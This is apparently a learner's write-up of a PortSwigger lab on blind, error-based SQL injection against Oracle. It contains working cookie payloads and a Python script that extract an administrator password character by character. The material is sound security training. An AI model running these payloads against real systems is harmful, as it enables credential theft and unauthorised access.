# Lab: Blind SQL Injection with Conditional Errors (Oracle)

**Difficulty:** Practitioner  
**Platform:** PortSwigger Web Security Academy  
**Topic:** Blind SQL Injection  
**Database:** Oracle  

---

## Objective

The application uses a tracking cookie for analytics and performs a SQL query containing its value. Query results are never returned to the user, and the app does not behave differently based on whether the query returns rows. However, if the SQL query causes a **database error**, the app returns a custom error message (HTTP 500). The goal is to exploit this behaviour to extract the `administrator` password from the `users` table and log in.

---

## Key Concepts

### What is Blind SQL Injection?
In regular SQLi you can see the query output directly. In **blind SQLi**, you get no output — instead you ask the database true/false questions and infer the answer from the application's behaviour. In this case:

- **HTTP 500** = query caused a database error = condition was **TRUE**
- **HTTP 200** = query ran fine = condition was **FALSE**

### Oracle-Specific Syntax (Important!)
Oracle behaves differently from MySQL/PostgreSQL in several ways:

| Feature | MySQL/PostgreSQL | Oracle |
|---|---|---|
| String concat | `+` or `\|\|` | `\|\|` only |
| Dummy table | Not needed | `FROM dual` required |
| Substring | `SUBSTRING()` | `SUBSTR()` |
| Error trigger | `CAST(1/0 AS TEXT)` | `TO_CHAR(1/0)` |
| Multi-row subquery | Usually fine | Throws error if >1 row returned |

> **`dual`** is a special built-in dummy table in Oracle that always has exactly one row. Since Oracle requires every `SELECT` to have a `FROM` clause, you use `dual` when you don't need a real table.

---

## Step-by-Step Walkthrough

### Step 1: Intercept the Request in Burp Suite

1. Open Burp Suite → go to **Proxy → Intercept**
2. Open the Burp browser and browse to the lab
3. Click on any product category to trigger a request containing the `TrackingId` cookie
4. Send the intercepted request to **Repeater** (right-click → Send to Repeater)

The cookie will look something like:
```
Cookie: TrackingId=abc123xyz; session=yoursessiontoken
```

---

### Step 2: Confirm SQL Injection is Possible

Test by breaking and fixing the SQL string:

```sql
TrackingId=abc123xyz'
```
→ Returns **HTTP 500** (broken SQL syntax)

```sql
TrackingId=abc123xyz''
```
→ Returns **HTTP 200** (the double quote escapes the single quote, valid SQL)

This confirms the TrackingId value is being **directly inserted into a SQL query** without sanitisation.

> **Why does `''` fix it?** In SQL, `''` is an escaped single quote inside a string — the database sees it as a valid empty string rather than a broken syntax.

---

### Step 3: Identify the Database (Oracle Fingerprinting)

Try selecting from no table (works in MySQL/PostgreSQL, fails in Oracle):
```sql
TrackingId=abc123xyz'||(SELECT '')--
```
→ **500 error** on Oracle (Oracle requires `FROM` clause)

Now try Oracle's dummy table:
```sql
TrackingId=abc123xyz'||(SELECT '' FROM dual)--
```
→ **200 OK** ✅ — confirms this is an **Oracle database**

> **`||`** is Oracle's string concatenation operator. Whatever your subquery returns gets appended to the TrackingId value. This is how you "attach" your injected query to the legitimate one.

---

### Step 4: Confirm the Users Table Exists

```sql
TrackingId=abc123xyz'||(SELECT '' FROM users WHERE ROWNUM=1)--
```
→ **200 OK** = `users` table exists ✅  
→ **500 error** = table doesn't exist ❌

> **`ROWNUM=1`** limits the result to 1 row. Without it, if `users` has multiple rows, Oracle may complain about the subquery returning too many rows.

---

### Step 5: Confirm the Administrator User Exists

```sql
TrackingId=abc123xyz'||(SELECT '' FROM users WHERE username='administrator')--
```
→ **200 OK** = administrator user exists ✅

---

### Step 6: Set Up the Error-Based Oracle (True/False Engine)

This is the core technique. We use Oracle's `CASE WHEN` as an if/else and trigger a divide-by-zero error to signal TRUE:

```sql
TrackingId=abc123xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '0' END FROM dual)--
```
→ `1=1` is TRUE → executes `TO_CHAR(1/0)` → divide by zero → **500 error** ✅

```sql
TrackingId=abc123xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '0' END FROM dual)--
```
→ `1=2` is FALSE → returns `'0'` → no error → **200 OK** ✅

**Breaking down the CASE WHEN:**
```sql
CASE WHEN (condition)        -- if condition is true...
  THEN TO_CHAR(1/0)          -- divide by zero → crash → 500
  ELSE '0'                   -- return harmless value → 200
END
```

---

### Step 7: Determine Password Length

Now apply the oracle to a real condition — checking password length:

```sql
TrackingId=abc123xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username='administrator')--
```

Keep incrementing the number using binary search or sequential testing:

```
LENGTH(password)>1   → 500 (longer than 1)
LENGTH(password)>10  → 500 (longer than 10)
LENGTH(password)>20  → 200 (NOT longer than 20) ← password is exactly 20!
LENGTH(password)>19  → 500 (longer than 19) ← confirms length is 20
```

Or use exact match `=` to confirm:
```sql
LENGTH(password)=20  → 500 ✅ confirmed!
```

> PortSwigger lab passwords are typically **20 characters** long.

> **Why `WHERE username='administrator'` instead of `AND username='administrator'` inside CASE?**  
> Putting the filter in the `WHERE` clause ensures only 1 row is returned before the CASE runs. Oracle throws an error if a subquery returns multiple rows, which would break your true/false logic.

---

### Step 8: Extract the Password Using Burp Intruder

Now extract each character one by one using `SUBSTR`:

```sql
TrackingId=abc123xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username='administrator')--
```

**`SUBSTR(password, position, length)`** — extracts characters from a string:
- `SUBSTR(password, 1, 1)` = first character
- `SUBSTR(password, 2, 1)` = second character
- etc.

**Setting up Burp Intruder:**

1. Right-click the request in Repeater → **Send to Intruder**
2. In Intruder, go to **Positions** tab
3. Set attack type to **Sniper** (one payload set at a time is fine here)
4. Clear all auto-detected positions
5. Highlight the `1` (position) and click **Add §** → becomes `§1§`
6. Highlight the `a` (character guess) and click **Add §** → becomes `§a§`

Actually for efficiency use **Cluster Bomb** (two payload sets):
- Payload set 1 (position): Numbers 1–20
- Payload set 2 (character): a–z and 0–9

**In Payloads tab:**
- Set 1: Simple list → add numbers 1 to 20
- Set 2: Simple list → add `a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9`

**In Settings tab:**
- Under **Grep - Match** → add `500` to flag 500 responses

6. Click **Start Attack**
7. Sort by status code — all **500** responses = correct character at that position

---

### Step 9: Assemble and Use the Password

Note down the character for each position (the one that returned 500), assemble all 20 characters in order, then:

1. Go to the lab's **My Account** page
2. Log in with:
   - Username: `administrator`
   - Password: `<your extracted password>`
3. **Lab Solved!** ✅

---

## Full Payload Reference

```sql
-- Confirm injection point
TrackingId=xyz'

-- Confirm Oracle database
TrackingId=xyz'||(SELECT '' FROM dual)--

-- Confirm users table exists
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)--

-- Confirm administrator exists
TrackingId=xyz'||(SELECT '' FROM users WHERE username='administrator')--

-- Test true/false oracle (should 500)
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '0' END FROM dual)--

-- Get password length
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username='administrator')--

-- Extract character at position N
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username='administrator')--
```

---

## Common Mistakes & Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| All requests return 500 | Nested/malformed payload from copy-paste | Retype cleanly in Raw tab as one single line |
| `FROM users` gives error but `FROM dual` works | Subquery returning multiple rows | Always add `WHERE username='administrator'` |
| `>` symbol not working | URL encoding issue | Use `%3e` instead of `>` in the URL |
| Session gets logged out | Session cookie got corrupted | Make sure `;` separates TrackingId from session cookie |
| Intruder is very slow | Community Edition rate limiting | Use a Python script with `requests` library instead |

---

## Python Automation Alternative (for Intruder step)

If Burp Community Edition is too slow, use this Python script:

```python
import requests
import string

url = "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Tech+gifts"
session_cookie = "YOUR_SESSION_TOKEN"
tracking_id = "YOUR_TRACKING_ID"

charset = string.ascii_lowercase + string.digits
password = ""

for position in range(1, 21):
    for char in charset:
        payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username='administrator')--"
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        response = requests.get(url, cookies=cookies)
        if response.status_code == 500:
            password += char
            print(f"[+] Position {position}: {char}  →  Password so far: {password}")
            break

print(f"\n[✓] Full password: {password}")
```

---

## What I Learned

- How blind SQLi works when no data is returned directly
- How to use **conditional errors** as a true/false oracle
- Oracle-specific SQL syntax differences vs MySQL/PostgreSQL
- How `CASE WHEN` acts as an if/else in SQL
- How `TO_CHAR(1/0)` triggers a controlled database error in Oracle
- Why `FROM dual` is needed in Oracle
- How to use Burp Intruder's Cluster Bomb attack for character brute-forcing
- Why subqueries must return exactly 1 row in Oracle
- How to fingerprint a database type through error behaviour
